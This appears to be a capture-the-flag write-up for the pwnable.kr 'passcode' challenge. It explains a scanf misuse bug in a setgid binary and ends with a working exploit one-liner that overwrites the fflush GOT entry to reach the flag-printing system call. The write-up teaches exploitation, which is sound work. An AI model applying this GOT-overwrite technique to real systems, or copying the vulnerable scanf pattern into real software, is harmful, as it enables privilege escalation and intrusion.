![logo](http://www.pwnable.kr/img/passcode.png)

# passcode
The fifth challenge from pwnable.kr

## Description
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

`ssh passcode@pwnable.kr -p2222` (pw:guest)

## Solution

After ssh, we see the following:

```sh
ls -lh
```

```
-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
-r-xr-sr-x 1 root passcode_pwn 7.4K Jun 26  2014 passcode
-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
```

We can see that executes with suid bit of passcode_pwn, which would allow it to open flag.

Let's try to compile the source code to see what warning they're talking about.

```sh
gcc passcode.c
```

```
passcode.c: In function ‘login’:
passcode.c:9:2: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
  scanf("%d", passcode1);
  ^
passcode.c:14:9: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
         scanf("%d", passcode2);
         ^
```

If we try to run the program, we get the following:

```sh
./passcode
```

```
Toddler's Secure Login System 1.0 beta.
enter you name : Fuck
Welcome Fuck!
enter passcode1 : 338150
enter passcode2 : 13371337
Segmentation fault
```

Source code is provided again in this challenge, let's take a look at it.

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;
}
```

The disassembly gives us more insight on which memory addresses are being used during the passcode comparisons.

```asm
80485c5:	81 7d f0 e6 28 05 00 	cmpl   $0x528e6,-0x10(%ebp)
80485cc:	75 23                	jne    80485f1 <login+0x8d>
80485ce:	81 7d f4 c9 07 cc 00 	cmpl   $0xcc07c9,-0xc(%ebp)
80485d5:	75 1a                	jne    80485f1 <login+0x8d>
80485d7:	c7 04 24 a5 87 04 08 	movl   $0x80487a5,(%esp)
80485de:	e8 6d fe ff ff       	call   8048450 <puts@plt>
80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)
80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
```

Let's see what the stack looks like if we fill name[100].

```sh
pwndbg ./passcode
```

```
pwndbg> b *0x80485c5
Breakpoint 1 at 0x80485c5
```

```
pwndbg> r
Starting program: /home/ctf/challenges/passcode/passcode
Toddler's Secure Login System 1.0 beta.
enter you name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
enter passcode1 : a
enter passcode2 : checking...

Breakpoint 1, 0x080485c5 in login ()
```

```
pwndbg> x/4wx $ebp-0x10
0xff925418:	0x61616161	0xbf99e000	0x00000000	0x00000000
```

Part of our buffer is reused in the stack of login(), particularly the memory address of passcode1 which is `-0x10(%ebp)`.

`scanf("%d", passcode1)` is not dereferencing passcode1, which means scanf will load an address and write a value there instead.

So let's write an address with the last 4 bytes during `scanf("%100s", name)`, then overwrite with a value of our own during `scanf("%d", passcode1)`.

One thing we can do, since this code is dynamically linked, is overwrite a reloc in the PLT so that our code jumps where we want when that call is made.

```
Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts
0804a010  00000507 R_386_JUMP_SLOT   00000000   system
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf
```

`fflush(stdin)` is conveniently called right after our second scanf, and also has neither whitespace/null hex value representations in its address, so let's use that.

`80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)` is where we want to jump to.

We pad our buffer with 96 bytes, then the address of fflush, `0x0804a004`, then the address we want to jump to when fflush is eventually called, in int representation, `134514147`.


### Capturing the Flag

```sh
passcode@ubuntu:~$ python -c "print('a'*96+'\x04\xa0\x04\x08\n134514147\n10\n')" > /tmp/passcode.input
passcode@ubuntu:~$ ./passcode < /tmp/passcode.input
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```
